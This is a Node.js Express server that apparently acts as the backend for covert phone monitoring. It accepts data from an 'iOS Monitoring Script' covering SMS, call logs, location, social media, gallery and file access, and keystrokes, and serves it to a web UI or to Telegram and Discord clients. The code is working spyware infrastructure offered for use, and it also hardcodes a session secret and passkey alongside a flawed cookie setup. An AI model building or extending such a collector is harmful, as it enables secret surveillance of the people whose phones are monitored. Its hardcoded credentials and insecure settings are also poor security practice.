const express = require('express');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();

// Middleware
app.use(cors({
    origin: 'https://iosx.vercel.app', // Your frontend URL
    credentials: true // Allow credentials to be sent
}));
app.use(bodyParser.json());
app.use(session({
    store: new FileStore(), // Use FileStore for sessions
    secret: '507402e9bca79ed5711bb5b3cec082b9c9c8846bfe2405dbc8e0da3ca445acc0', // Replace with your actual secret key
    resave: false,
    saveUninitialized: false,
    cookie: { 
        maxAge: 86400000, // Set cookie to expire in 1 day (24 hours)
        httpOnly: true,
        secure: false, // Set to true if using HTTPS in production
        sameSite: 'none'
    }
}));


// Replace with your actual passkey
const correctPasskey = "9ecd92e21bb795a6064f1c9c6cc4fb9b";

let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint to authenticate the user
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    
    // Check if passkey matches
    if (passkey === correctPasskey) {
        req.session.authenticated = true; // Set session auth flag
        res.status(200).json({ message: "Login successful" });
    } else {
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Middleware to check if user is authenticated
function isAuthenticated(req, res, next) {
    if (req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ message: "Unauthorized" });
    }
}

// Endpoint for iOS Monitoring Script to send data
app.post('/monitor', isAuthenticated, (req, res) => {
    const { activityType, data } = req.body;
    if (activityType && activityData[activityType] !== undefined) {
        activityData[activityType] = data;
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});

// Endpoint for clients (Web UI, Telegram, Discord) to fetch data for a specific activity
app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
    const { activityType } = req.params;
    res.json({ data: activityData[activityType] || "No data available" });
});

// Endpoint to check authentication status
app.get('/auth-status', (req, res) => {
    if (req.session.authenticated) {
        res.status(200).json({ authenticated: true });
    } else {
        res.status(401).json({ authenticated: false });
    }
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(() => {
        res.status(200).json({ message: "Logged out" });
    });
});

app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
